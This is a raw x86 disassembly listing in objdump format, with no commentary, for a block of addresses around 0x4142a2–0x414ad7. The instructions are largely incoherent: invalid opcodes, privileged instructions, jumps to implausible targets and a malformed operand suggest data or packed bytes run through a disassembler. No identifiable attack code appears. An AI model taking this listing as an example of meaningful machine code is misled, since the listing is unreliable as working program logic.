  4142a2:	add    bh,bh
  4142a4:	dec    ebp
  4142a5:	and    BYTE PTR [ecx-0x38],dl
  4142a8:	push   eax
  4142a9:	dec    DWORD PTR [ebx+0xfd885]
  4142af:	mov    BYTE PTR [ebp+0x508bac00],cl
  4142b5:	mov    WORD PTR [ecx+0x0],ss
  4142b8:	lea    ecx,[ebx+0x108b20d8]
  4142be:	mov    WORD PTR [edx],ds
  4142c0:	add    BYTE PTR [edi+0xff01ff],al
  4142c6:	mov    ecx,DWORD PTR [ebp-0x28]
  4142c9:	push   ecx
  4142ca:	shl    BYTE PTR [ebp+0x3a],0x8b
  4142ce:	inc    ebp
  4142cf:	in     al,0xeb
  4142d1:	jno    0x41425e
  4142d3:	push   edx
  4142d4:	mov    DWORD PTR [eax-0x28],edx
  4142d7:	mov    eax,DWORD PTR [ebp+0x20]
  4142da:	je     0x414263
  4142dc:	mov    eax,DWORD PTR [ecx]
  4142de:	sbb    BYTE PTR [eax],al
  4142e0:	pop    DWORD PTR [eax]
  4142e2:	add    esi,eax
  4142e4:	add    bl,al
  4142e6:	adc    DWORD PTR [edi],esi
  4142e8:	jmp    0x8bcc933a
  4142ed:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4142f4:	jne    0x414281
  4142f6:	mov    ecx,DWORD PTR [eax]
  4142f8:	in     al,0x75
  4142fa:	pop    DWORD PTR [ecx+0x5501]
  414300:	push   edx
  414301:	inc    DWORD PTR [ebx]
  414303:	adc    BYTE PTR [ecx+0x45721cc6],cl
  414309:	add    BYTE PTR [edi+0x9],dl
  41430c:	call   DWORD PTR [esi]
  41430e:	and    dl,al
  414310:	and    bh,bh
  414312:	inc    edi
  414314:	test   eax,edx
  414316:	sldt   ebx
  414319:	xor    BYTE PTR [eax],al
  41431b:	pushf  
  41431c:	(bad)  
  41431d:	jmp    0x41432b
  41431f:	mov    eax,edi
  414321:	or     al,0x75
  414323:	inc    eax
  414324:	call   0x413a2c
  414329:	mov    eax,eax
  41432b:	loopne 0x4142b1
  41432d:	inc    ebp
  41432e:	add    BYTE PTR [ebx+0x1451c00],cl
  414334:	mov    eax,DWORD PTR [ebp+0x20]
  414337:	add    edi,ecx
  414339:	add    BYTE PTR [eax],ch
  41433b:	cmp    edi,0x18
  41433e:	test   DWORD PTR [ebp+0xf],esi
  414341:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  414348:	jne    0x41434c
  41434a:	call   0xffa03e0f
  41434f:	leave  
  414350:	rcr    BYTE PTR [esp+eax*4],0x55
  414354:	add    ah,ch
  414356:	add    BYTE PTR [edi-0x48fef979],dh
  41435c:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  414363:	inc    esp
  414364:	mov    ebx,DWORD PTR [eax]
  414366:	fcom   st(2)
  414368:	add    BYTE PTR [edi],bl
  41436a:	lea    ecx,[eax-0x18]
  41436d:	(bad)  
  41436e:	push   DWORD PTR [ecx]
  414370:	call   0xffb390d2
  414375:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  414379:	fstp   DWORD PTR [esi+ebx*8]
  41437c:	push   ebp
  41437d:	pop    ebp
  41437e:	mov    esi,DWORD PTR [edx-0x38]
  414381:	add    DWORD PTR [eax],0x28
  414384:	mov    edi,DWORD PTR [ebx]
  414386:	xor    esi,DWORD PTR [edx+0x3]
  414389:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  41438d:	pop    ebp
  41438e:	or     al,0x4
  414390:	inc    ecx
  414391:	push   ebp
  414392:	(bad)  
  414393:	in     al,dx
  414394:	or     ah,ch
  414396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414397:	xbegin 0xffc6b98d
  41439d:	clc    
  41439e:	adc    al,0x45
  4143a0:	div    BYTE PTR [eax]
  4143a2:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4143a9:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  4143b0:	jno    0x414418
  4143b2:	add    eax,DWORD PTR [ebp+0x52]
  4143b5:	adc    eax,0xffffffa0
  4143b8:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  4143be:	test   DWORD PTR [eax],eax
  4143c0:	clc    
  4143c1:	data16 or al,BYTE PTR [ebp+0x45]
  4143c5:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4143cc:	rol    BYTE PTR [ebp+0x45],1
  4143cf:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4143d5:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4143db:	push   ebx
  4143dc:	add    BYTE PTR [ebp+0x0],dl
  4143df:	push   ecx
  4143e0:	jge    0x414415
  4143e2:	add    BYTE PTR [esi+0x4],dl
  4143e5:	jne    0x41444c
  4143e7:	mov    edx,0x457200
  4143ec:	jmp    0x4143b0
  4143ee:	xor    edi,DWORD PTR [ebx]
  4143f0:	pop    edi
  4143f1:	cvtdq2ps xmm7,xmm0
  4143f4:	ret    0x0
  4143f7:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4143fd:	xor    ecx,DWORD PTR [edi]
  4143ff:	add    eax,DWORD PTR [ecx+0x3b]
  414402:	push   ebx
  414403:	rdpmc  
  414405:	out    0x8d,al
  414407:	add    BYTE PTR [eax],cl
  414409:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  41440f:	ret    0x450c
  414412:	sbb    al,0x8b
  414414:	cmp    eax,esi
  414416:	or     cl,al
  414418:	or     al,0xc2
  41441a:	pop    eax
  41441b:	inc    ebp
  41441c:	add    ecx,DWORD PTR [edi]
  41441e:	add    esi,DWORD PTR [ebp+0x39]
  414421:	invd   
  414423:	jge    0x41442f
  414425:	mov    eax,0x478ac0
  41442a:	cli    
  41442b:	xor    esp,ecx
  41442d:	mov    ebx,0x5b8ac0
  414432:	ret    0x33
  414435:	mov    eax,0x833b8b
  41443a:	sub    BYTE PTR [ebx],al
  41443c:	inc    ebp
  41443d:	xor    ax,di
  414440:	pushf  
  414441:	inc    bh
  414443:	mov    esp,esp
  414445:	hlt    
  414446:	test   DWORD PTR [ebp-0x8],esi
  414449:	mov    eax,DWORD PTR [ebp-0x14]
  41444c:	xor    ecx,DWORD PTR [ebx-0x76478864]
  414452:	dec    edi
  414453:	or     BYTE PTR [eax],al
  414455:	jne    0x4143e0
  414457:	mov    esi,esp
  414459:	call   0x77a7d01e
  41445e:	inc    ebp
  41445f:	mov    DWORD PTR [eax+0x9c4f0c],edi
  414465:	add    BYTE PTR [ecx-0x3ffe0717],cl
  41446b:	add    BYTE PTR [esi+0x7d],ah
  41446e:	inc    ebp
  41446f:	mov    bx,WORD PTR [ebp+0x8]
  414473:	add    DWORD PTR [ebp+0x55],0x30c008b
  41447a:	inc    ebp
  41447b:	mov    bx,di
  41447e:	lock test BYTE PTR [ecx+0x7000801],bh
  414485:	jge    0x414448
  414487:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  41448d:	cli    
  41448e:	xor    bl,bh
  414490:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  414496:	test   BYTE PTR [eax],cl
  414498:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  41449f:	cmp    ebp,eax
  4144a1:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4144a8:	test   BYTE PTR [ebp+0x1],bh
  4144ab:	mov    ebx,0x458a00
  4144b0:	xor    esi,DWORD PTR [ebx]
  4144b2:	add    esp,DWORD PTR [esi-0x77]
  4144b5:	pop    ebp
  4144b6:	loopne 0x41451e
  4144b8:	inc    ebp
  4144b9:	clc    
  4144ba:	xor    edi,DWORD PTR [ebx]
  4144bc:	add    esi,DWORD PTR [edx-0x77]
  4144bf:	data16 fdivr QWORD PTR [ebp-0x49]
  4144c3:	mov    ebx,0xb78afc
  4144c8:	hlt    
  4144c9:	xor    edi,DWORD PTR [esi]
  4144cb:	data16 add BYTE PTR [ebp+0x66],bl
  4144cf:	data16 lock clc 
  4144d2:	cmp    eax,DWORD PTR ds:[eax]
  4144d5:	ja     0x41453d
  4144d7:	psubq  mm7,QWORD PTR [ebp+0x4]
  4144db:	ltr    WORD PTR [ebp+0x66]
  4144df:	add    esi,eax
  4144e1:	add    di,WORD PTR [ebp+0x2b]
  4144e5:	data16 data16 jge 0x414566
  4144e9:	mov    ebx,0xe08a8b
  4144ee:	jge    0x414523
  4144f0:	data16 data16 xor al,0x5d
  4144f4:	data16 data16 jne 0x4144f0
  4144f8:	mov    edi,DWORD PTR [ebx]
  4144fa:	fdiv   QWORD PTR [edx+0x7d]
  4144fd:	data16 data16 jge 0x414535
  414501:	mov    ebx,0x758a66
  414506:	mov    esi,0x667233
  41450b:	pop    ebp
  41450c:	or     BYTE PTR [esi+0x0],ah
  41450f:	clc    
  414510:	mov    edi,DWORD PTR [ebx]
  414512:	lock ja 0x4144a0
  414515:	(bad)  
  414517:	jge    0x414510
  414519:	invd   
  41451b:	pop    ebp
  41451c:	add    BYTE PTR [ebx],al
  41451e:	(bad)  
  41451f:	cmp    di,WORD PTR [ebp+0xf]
  414523:	data16 sbb bh,BYTE PTR [ebp+0x0]
  414527:	mov    bx,WORD PTR [ebp-0x10]
  41452b:	pop    bp
  41452d:	fbstp  TBYTE PTR [ebx]
  41452f:	test   DWORD PTR [ebx],eax
  414531:	add    BYTE PTR [ebx],bh
  414533:	add    BYTE PTR [esi+0x7d],ah
  414536:	jge    0x4144c3
  414538:	data16 in al,dx
  41453a:	pop    ebp
  41453b:	stc    
  41453c:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  414543:	mov    edi,ebx
  414545:	in     al,dx
  414546:	test   BYTE PTR [ebp+0x0],bh
  414549:	mov    eax,DWORD PTR [eax]
  41454b:	call   0xbd3e3edb
  414550:	ds pushf 
  414552:	add    BYTE PTR [edx],dh
  414554:	mov    bx,di
  414557:	call   0x8b49c2e7
  41455c:	add    ebp,esp
  41455e:	mov    bx,di
  414561:	jnp    0x414589
  414563:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  414569:	mov    eax,DWORD PTR [eax]
  41456b:	call   0x7c3cd0d6
  414570:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  414576:	data16 data16 fistp WORD PTR [ebp+0xe]
  41457b:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  414585:	fisttp WORD PTR [ecx-0x7401f77b]
  41458b:	(bad)  
  41458c:	cld    
  41458d:	jne    0x4145cd
  41458f:	xor    eax,DWORD PTR [eax]
  414591:	mov    esp,DWORD PTR [esi-0x10]
  414594:	sti    
  414595:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  41459c:	data16 adc bl,bh
  41459f:	push   ebp
  4145a0:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  4145a7:	mov    WORD PTR [eax],es
  4145a9:	pushf  
  4145aa:	data16 xor bh,bl
  4145ad:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4145b3:	mov    esp,DWORD PTR [esi-0x14]
  4145b6:	fisttp WORD PTR [ebx-0x3748a9f2]
  4145bc:	or     al,0x2b
  4145be:	mov    bh,0xba
  4145c0:	hlt    
  4145c1:	mov    bh,bl
  4145c3:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4145c9:	dec    esi
  4145ca:	or     al,0x0
  4145cc:	mov    edi,DWORD PTR [ebx]
  4145ce:	or     BYTE PTR [ebp+0x3b],dh
  4145d1:	mov    ecx,DWORD PTR [edi]
  4145d3:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4145d9:	xor    al,0xd8
  4145db:	pop    bp
  4145dd:	lock xor esi,DWORD PTR [ebx]
  4145e0:	lea    esp,[esi+0x1f]
  4145e3:	icebp  
  4145e4:	jb     0x4145ea
  4145e6:	add    al,al
  4145e8:	jge    0x4145f6
  4145ea:	mov    eax,eax
  4145ec:	fsubr  st,st(3)
  4145ee:	pop    ebp
  4145ef:	mov    esi,DWORD PTR [ebx]
  4145f1:	in     al,0x8d
  4145f3:	rcr    DWORD PTR [edi],0xc2
  4145f6:	jb     0x414656
  4145f8:	add    cl,cl
  4145fa:	jge    0x414608
  4145fc:	mov    edx,DWORD PTR [ebp-0x20]
  4145ff:	in     al,dx
  414600:	pop    ebp
  414601:	data16 data16 or BYTE PTR [esi+edi*4],bh
  414606:	cmp    di,WORD PTR [ebp+0x0]
  41460a:	mov    ebp,DWORD PTR [ebx]
  41460c:	fdivr  QWORD PTR [esi+0x668a5d]
  414612:	cmp    al,0x33
  414614:	mov    si,0x4e7d
  414618:	mov    eax,DWORD PTR [eax]
  41461a:	lock inc ebp
  41461c:	mov    esi,DWORD PTR [esi]
  41461e:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  414625:	clc    
  414626:	(bad)  
  414627:	cmp    edi,DWORD PTR [ebx]
  414629:	je     0x41463a
  41462b:	push   ebx
  41462c:	loopne 0x41463d
  41462e:	dec    ecx
  414630:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  414634:	icebp  
  414635:	mov    esi,0x703084d
  41463a:	pcmpgtd mm6,mm1
  41463d:	add    BYTE PTR [ebp+0x66],dh
  414640:	jmp    0x41460d
  414642:	mov    eax,DWORD PTR [ebx]
  414644:	lock push ebp
  414646:	ror    DWORD PTR [ebp-0x2972feb3],1
  41464c:	or     bh,dl
  41464e:	jb     0x41464e
  414650:	add    BYTE PTR [ebx-0x1a7487b3],cl
  414656:	loopne 0x414658
  414658:	jne    0x41465e
  41465a:	data16 add BYTE PTR [esi+eiz*2],dh
  41465e:	mov    ecx,ebx
  414660:	data16 ds icebp 
  414663:	add    BYTE PTR [esi],bh
  414665:	data16 add bl,cl
  414668:	retw   0xf2
  41466c:	ret    0x66
  41466f:	retf   
  414670:	enterw 0x4df1,0x19
  414675:	pop    edi
  414676:	jne    0x4145f9
  414678:	mov    esi,DWORD PTR [esi]
  41467a:	call   0x77b5d21b
  41467f:	xor    ebp,DWORD PTR [ebx]
  414681:	lea    esp,[esi+0x48]
  414684:	repnz in eax,0x3b
  414687:	add    BYTE PTR [ebp-0x37],dh
  41468a:	xor    edx,DWORD PTR [ebp-0x15]
  41468d:	in     al,dx
  41468e:	xor    edx,DWORD PTR [esi+0x40]
  414691:	mov    DWORD PTR [edi],0x338545fc
  414697:	clc    
  414698:	add    esi,DWORD PTR [ecx]
  41469a:	pop    edi
  41469b:	pushf  
  41469c:	pop    ebx
  41469d:	call   0xff424664
  4146a2:	mov    edi,eax
  4146a4:	push   ecx
  4146a5:	pop    es
  4146a6:	mov    esi,DWORD PTR [edi]
  4146a8:	push   esi
  4146a9:	inc    edi
  4146aa:	add    al,0x70
  4146ac:	add    BYTE PTR [ecx+0x66],ah
  4146af:	(bad)  
  4146b0:	into   
  4146b1:	fs ds int 0x0
  4146b5:	mov    ecx,0x7ce0866
  4146ba:	ret    0x66
  4146bd:	add    bh,al
  4146bf:	add    al,0xfc
  4146c1:	add    BYTE PTR [ebp+0x31c3f866],al
  4146c7:	ds pushf 
  4146c9:	add    BYTE PTR [esi+0x66],ah
  4146cc:	into   
  4146cd:	ret    
  4146ce:	pop    ebp
  4146cf:	adc    al,0x57
  4146d1:	add    BYTE PTR [edi-0x723c409a],dh
  4146d7:	add    edi,edi
  4146d9:	jne    0x414730
  4146db:	lea    edx,[ecx+0x1]
  4146de:	mov    ebx,0xd64ff1
  4146e3:	sar    DWORD PTR [ebx],1
  4146e5:	test   BYTE PTR [ebp+0x38],dh
  4146e8:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4146ec:	push   edi
  4146ed:	xor    BYTE PTR [ebx],0x37
  4146f0:	mov    esi,ebx
  4146f2:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  4146f8:	cmp    BYTE PTR [ebp+0x64],al
  4146fb:	pop    ebx
  4146fc:	mov    ebx,0x9c3b36
  414701:	je     0x41472e
  414703:	xor    edi,DWORD PTR [ebx+0x668a33]
  414709:	mov    WORD PTR [ebx],?
  41470b:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  414711:	pop    edi
  414712:	cmp    ecx,ecx
  414714:	jne    0x41476b
  414716:	mov    ebp,esp
  414718:	cld    
  414719:	push   esi
  41471a:	pop    ebx
  41471b:	inc    ebp
  41471c:	stc    
  41471d:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  414725:	clc    
  414726:	test   dl,dl
  414728:	cmp    bh,bh
  41472a:	fs pop si
  41472d:	or     bl,al
  41472f:	add    al,0x8b
  414731:	add    BYTE PTR [ecx+0x66],dl
  414734:	push   edi
  414735:	retf   0x3e45
  414738:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  414740:	clc    
  414741:	add    BYTE PTR [ebx+0x66],bl
  414744:	dec    edx
  414746:	mov    edx,DWORD PTR [edi-0x76]
  414749:	push   edi
  41474a:	add    al,0xb7
  41474c:	xor    al,0xba
  41474e:	cmp    al,0x8d
  414750:	je     0x414751
  414752:	mov    edx,DWORD PTR [ebp-0x46]
  414755:	push   ecx
  414756:	lea    edi,[ebx+0x554fff]
  41475c:	push   ecx
  41475d:	cmp    edx,DWORD PTR [ebx+0x75]
  414760:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  414766:	add    BYTE PTR [ebx],dh
  414768:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  41476e:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  414775:	mov    ebx,0x3b3b00
  41477a:	jne    0x4147a7
  41477c:	mov    DWORD PTR [ebx+0x728afc],edi
  414782:	xor    esi,DWORD PTR [ebx]
  414784:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  41478a:	push   edi
  41478b:	cmp    esp,ebp
  41478d:	jne    0x41478f
  41478f:	sbb    DWORD PTR [eax],0x8085c3fc
  414795:	clc    
  414796:	inc    edi
  414797:	pop    ebx
  414798:	sti    
  414799:	add    eax,0xeb8bc075
  41479e:	cld    
  41479f:	xor    edi,DWORD PTR ds:0xf8c3855e
  4147a5:	mov    ecx,DWORD PTR [ecx+edx*2]
  4147a8:	rol    DWORD PTR [ebp-0x37],0xf
  4147ac:	mov    DWORD PTR [eax],ecx
  4147ae:	inc    edi
  4147af:	(bad)  
  4147b0:	in     eax,0xfc
  4147b2:	add    bh,bh
  4147b4:	(bad)  
  4147b5:	mov    esi,0xc38a5e
  4147ba:	mov    esi,DWORD PTR [ebx]
  4147bc:	push   ecx
  4147bd:	mov    edi,0xfc4ec7
  4147c2:	test   DWORD PTR [ebp-0x8],edx
  4147c5:	xor    di,ax
  4147c8:	pushf  
  4147c9:	sub    ebp,eax
  4147cb:	inc    ebp
  4147cc:	(bad)  
  4147cd:	sub    edi,edi
  4147cf:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4147d5:	inc    ebp
  4147d6:	add    BYTE PTR [esi+0x2b],ah
  4147d9:	or     bh,BYTE PTR [edx+0xf8ac2]
  4147df:	cmp    al,0x33
  4147e1:	mov    edi,DWORD PTR [edx+0xfc4e81]
  4147e7:	(bad)  
  4147e8:	cmp    esi,DWORD PTR [ebx]
  4147ea:	je     0x4147a4
  4147ec:	push   ebx
  4147ed:	dec    esi
  4147ee:	str    ecx
  4147f1:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  4147f5:	xor    edi,DWORD PTR [edi+0x789085f]
  4147fb:	mov    edx,DWORD PTR [esp+edi*8]
  4147fe:	add    cl,cl
  414800:	data16 add al,0xcb
  414803:	push   ebp
  414804:	add    ebp,esp
  414806:	jne    0x4147f4
  414808:	(bad)  
  414809:	mov    DWORD PTR [ecx],0xd685f7ec
  41480f:	clc    
  414810:	xlat   BYTE PTR ds:[ebx]
  414811:	inc    ebp
  414812:	mov    esi,DWORD PTR [eax]
  414814:	push   eax
  414815:	pushf  
  414816:	in     eax,0x8b
  414818:	add    ah,ch
  41481a:	add    al,0x55
  41481c:	add    BYTE PTR [ecx+0x66],dl
  41481f:	add    eax,0x3e72cb
  414824:	add    BYTE PTR [ebp+0x66],al
  414827:	(bad)  
  414828:	retf   
  414829:	lock ret 0x85
  41482d:	clc    
  41482e:	inc    bp
  414830:	retf   
  414831:	cmp    eax,0xc77d9cc8
  414836:	ss cld 
  414838:	pushf  
  414839:	test   DWORD PTR [edi-0x8],ebx
  41483c:	je     0x414883
  41483e:	xor    esi,DWORD PTR ds:0x7020840
  414844:	ror    BYTE PTR [ebp-0x37],0x8d
  414848:	push   ebp
  414849:	add    esp,ebp
  41484b:	jb     0x4147d8
  41484d:	add    BYTE PTR [eax],cl
  41484f:	dec    ebp
  414850:	mov    bh,0x81
  414852:	push   esi
  414853:	push   ebp
  414854:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  41485b:	xor    al,BYTE PTR [eax]
  41485d:	mov    edx,DWORD PTR [edi+0x10]
  414860:	(bad)  
  414861:	scas   eax,DWORD PTR es:[edi]
  414862:	ret    0x3b
  414865:	jns    0x3b424558
  41486b:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  41486f:	dec    ebp
  414870:	or     BYTE PTR [ebx],ch
  414872:	ret    0x458b
  414875:	lock jmp 0x414869
  414878:	mov    ecx,DWORD PTR [eax]
  41487a:	or     BYTE PTR [edi],al
  41487c:	mov    ecx,eax
  41487e:	xor    DWORD PTR [edx+0x2],0x0
  414882:	mov    bh,0xc1
  414884:	adc    BYTE PTR [eax],dh
  414886:	iret   
  414887:	inc    ebp
  414888:	mov    DWORD PTR [ebx],0x4dfff8c4
  41488e:	inc    BYTE PTR [ebx]
  414890:	ret    0xf8
  414893:	adc    DWORD PTR [esi+0x10],esp
  414896:	clc    
  414897:	dec    ecx
  414898:	fisttp WORD PTR [ecx+0x456604c0]
  41489e:	add    dh,BYTE PTR ds:0x75e0845
  4148a4:	ret    0x4d
  4148a7:	lea    ecx,[ebx+0x18728301]
  4148ad:	add    BYTE PTR [ebp+0x45],al
  4148b0:	xor    ecx,ebp
  4148b2:	pushf  
  4148b3:	add    bh,al
  4148b5:	add    al,ch
  4148b7:	inc    ebp
  4148b8:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4148be:	xor    eax,0x781084d
  4148c3:	push   ebp
  4148c4:	pushf  
  4148c5:	push   ecx
  4148c6:	xor    al,BYTE PTR [ecx+0x32f89c89]
  4148cc:	inc    ebp
  4148cd:	cmp    edi,DWORD PTR [ecx]
  4148cf:	jbe    0x41486d
  4148d1:	mov    eax,edi
  4148d3:	or     ah,dh
  4148d5:	inc    ebp
  4148d6:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4148dc:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4148e2:	in     al,dx
  4148e3:	hlt    
  4148e4:	push   ebp
  4148e5:	push   ebp
  4148e6:	push   ecx
  4148e7:	push   ecx
  4148e8:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4148ee:	pushf  
  4148ef:	pushf  
  4148f0:	xor    dh,BYTE PTR [edx]
  4148f2:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4148f8:	or     BYTE PTR [ebp+0x7],al
  4148fb:	mov    eax,ecx
  4148fd:	clc    
  4148fe:	jb     0x4148c1
  414900:	add    BYTE PTR [ebp+0x55],cl
  414903:	or     DWORD PTR [edi],0xc251d155
  414909:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  414913:	mov    edi,eax
  414915:	or     cl,al
  414917:	inc    ebp
  414918:	dec    ebp
  414919:	mov    eax,DWORD PTR [ecx+0x514d550c]
  41491f:	or     WORD PTR [ecx],0x899c
  414924:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  41492a:	mov    edx,DWORD PTR [ecx+0x8]
  41492d:	mov    eax,DWORD PTR [ebp-0x8]
  414930:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  414937:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  41493d:	inc    ebp
  41493e:	dec    eax
  41493f:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  414945:	add    edx,DWORD PTR [ecx-0x8]
  414948:	mov    ecx,DWORD PTR [ecx]
  41494a:	clc    
  41494b:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  414952:	mov    ecx,ebp
  414954:	clc    
  414955:	(bad)  
  414956:	popf   
  414957:	inc    DWORD PTR [eax]
  414959:	ret    0x8b
  41495c:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  414962:	mov    edi,esp
  414964:	hlt    
  414965:	test   ecx,esi
  414967:	clc    
  414968:	or     BYTE PTR [ebp+0x7],al
  41496b:	xor    cl,al
  41496d:	pushf  
  41496e:	jb     0x4149a3
  414970:	add    BYTE PTR [eax-0x3f],al
  414973:	inc    eax
  414974:	daa    
  414975:	inc    ebp
  414976:	inc    ebp
  414977:	xor    eax,0x7f80803
  41497c:	dec    ebp
  41497d:	pushf  
  41497e:	add    esi,DWORD PTR [edx]
  414980:	clc    
  414981:	cmp    DWORD PTR [ecx],ecx
  414983:	or     al,0x8
  414985:	add    al,BYTE PTR [ebp+0x2c]
  414988:	xor    eax,0x7350845
  41498d:	or     BYTE PTR [ebp+0x7],cl
  414990:	lea    ebx,[ecx+eax*1+0x8b7232]
  414997:	or     al,0x45
  414999:	enter  0x4deb,0x8b
  41499d:	mov    edx,DWORD PTR [eax]
  41499f:	cld    
  4149a0:	dec    ebp
  4149a1:	push   ebp
  4149a2:	sub    edx,DWORD PTR [ecx-0x75]
  4149a5:	add    eax,0xf172fc
  4149aa:	or     BYTE PTR [ebp+0x7],cl
  4149ad:	add    eax,ecx
  4149af:	or     al,0x72
  4149b1:	add    DWORD PTR [eax],eax
  4149b3:	mov    ebx,0x29c2c1
  4149b8:	inc    ebp
  4149b9:	mov    eax,DWORD PTR [ebx]
  4149bb:	cmp    eax,0x3004d1c
  4149c1:	xbegin 0x66c6d5bb
  4149c7:	clc    
  4149c8:	or     BYTE PTR [ebp+0x45],al
  4149cb:	xor    BYTE PTR ds:0x78b089c,dh
  4149d1:	adc    BYTE PTR [ebp+0x45],cl
  4149d4:	lea    eax,[ebp+0x33727501]
  4149da:	add    cl,ch
  4149dc:	inc    ebp
  4149dd:	add    bl,ch
  4149df:	add    BYTE PTR [ebx+0x45850845],cl
  4149e5:	je     0x414972
  4149e7:	push   ebx
  4149e8:	or     al,0x85
  4149ea:	dec    ebp
  4149eb:	std    
  4149ec:	mov    bh,bh
  4149ee:	mov    BYTE PTR [ebp-0x75],al
  4149f1:	mov    edi,eax
  4149f3:	or     al,0x89
  4149f5:	inc    ebp
  4149f6:	clc    
  4149f7:	mov    esp,esp
  4149f9:	hlt    
  4149fa:	call   DWORD PTR [edi-0x37]
  4149fd:	push   ebp
  4149fe:	or     al,0x51
  414a00:	push   ebp
  414a01:	xor    ebp,esp
  414a03:	mov    esi,0x457251
  414a08:	xor    esi,eax
  414a0a:	pushf  
  414a0b:	inc    ebp
  414a0c:	(bad)  
  414a0d:	mov    edi,eax
  414a0f:	or     al,0x85
  414a11:	add    al,bh
  414a13:	inc    eax
  414a15:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  414a19:	or     ah,bh
  414a1b:	inc    eax
  414a1c:	push   ebp
  414a1d:	jmp    0x414a70
  414a1f:	mov    eax,DWORD PTR ds:0xe8720c
  414a25:	mov    DWORD PTR [ebp-0x8],eax
  414a28:	jne    0x414a6f
  414a2a:	jmp    0x4149b7
  414a2c:	mov    ebp,DWORD PTR [eax]
  414a2e:	clc    
  414a2f:	retf   0xff55
  414a32:	push   ecx
  414a33:	mov    DWORD PTR ds:0x757210,eax
  414a39:	mov    ecx,DWORD PTR [ebp-0x4]
  414a3c:	sub    esp,DWORD PTR [ebx-0x77]
  414a3f:	dec    DWORD PTR [eax*4-0x74ca8abb]
  414a46:	or     ah,bh
  414a48:	pop    es
  414a49:	ds pushf 
  414a4b:	push   DWORD PTR [edx]
  414a4d:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  414a53:	(bad)  
  414a54:	mov    bh,bh
  414a56:	jmp    0x414a44
  414a58:	leave  
  414a59:	jne    0x414a63
  414a5b:	call   0x2e43b5
  414a60:	in     al,dx
  414a61:	dec    ebp
  414a62:	add    dh,BYTE PTR [ebx]
  414a64:	add    BYTE PTR [ebx],al
  414a66:	inc    ebp
  414a67:	cmp    esi,DWORD PTR [ecx]
  414a69:	je     0x414a07
  414a6b:	mov    eax,edi
  414a6d:	or     al,0xf0
  414a6f:	add    BYTE PTR [ebp+0x458bf845],al
  414a75:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  414a7b:	adc    al,0x7
  414a7d:	enter  0x9fc0,0xa5
  414a81:	rol    BYTE PTR [eax],0x5e
  414a84:	mov    ecx,ecx
  414a86:	or     al,0xc
  414a88:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  414a8f:	jmp    0x414a90
  414a91:	push   ebp
  414a92:	mov    esp,ebp
  414a94:	cld    
  414a95:	inc    ebp
  414a96:	inc    ebp
  414a97:	or     DWORD PTR [ecx+0x457dec10],0x0
  414a9e:	push   esi
  414a9f:	push   esi
  414aa0:	mov    edi,0x7af080f
  414aa5:	add    bh,al
  414aa7:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  414aae:	mov    DWORD PTR [edi],ecx
  414ab0:	adc    BYTE PTR [eax+0x45],al
  414ab3:	mov    ebp,eax
  414ab5:	mov    ebp,edi
  414ab7:	lock call edx
  414aba:	fcom   DWORD PTR [ebp+0x45]
  414abd:	mov    eax,0x148a8b
  414ac2:	push   ecx
  414ac3:	enter  0xc145,0x83
  414ac7:	cmp    ecx,DWORD PTR [eax]
  414ac9:	add    BYTE PTR [ebp+0x4d],al
  414acc:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  414ad2:	call   0xffa14641
  414ad7:	cmp    eax,DWORD PTR [ebp-0xc]
